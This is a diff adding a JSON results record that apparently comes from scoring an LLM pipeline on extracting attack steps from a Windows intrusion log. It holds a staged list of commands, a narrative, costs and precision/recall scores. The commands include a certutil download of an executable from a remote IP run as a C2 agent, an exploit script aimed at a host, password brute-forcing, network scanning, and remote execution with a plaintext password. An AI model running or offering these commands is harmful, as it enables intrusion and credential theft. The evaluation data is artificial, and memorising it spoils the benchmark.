@@ -1,0 +1,88 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "/c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "/c python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "-ExecutionPolicy Bypass -C ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "/c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "-ExecutionPolicy Bypass -C ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "/c nbtscan.exe 192.168.0.244/24",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "/c PAExec.exe \\\\192.168.0.95 -u administrator -p Data123456!",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "An unknown actor gained access through an initial exploit using `certutil` downloading `agent.exe`. They established command and control over the machine via the downloaded executable connecting back to their server. Following discovery reconnaissance using custom Python scripts (`PhpStudyPoc.py`) they evaded defenses utilizing PowerShell bypass techniques. Subsequent actions included privilege escalation attempts, lateral movement, credential harvesting and persistence establishment.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 16305,
+      "completion_tokens": 1115,
+      "total_tokens": 17420,
+      "wall_clock_s": 19.266,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.4444444444444444,
+      "recall": 0.5714285714285714,
+      "f1": 0.5,
+      "tp": 4,
+      "fp": 5,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.2222222222222222,
+      "recall": 0.3333333333333333,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 7,
+      "fn": 4,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 16305,
+      "completion_tokens": 1115,
+      "total_tokens": 17420,
+      "wall_clock_s": 19.266,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
